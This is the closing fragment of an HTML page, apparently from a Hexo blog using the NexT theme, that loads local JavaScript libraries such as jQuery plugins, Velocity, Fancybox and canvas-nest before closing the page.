    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
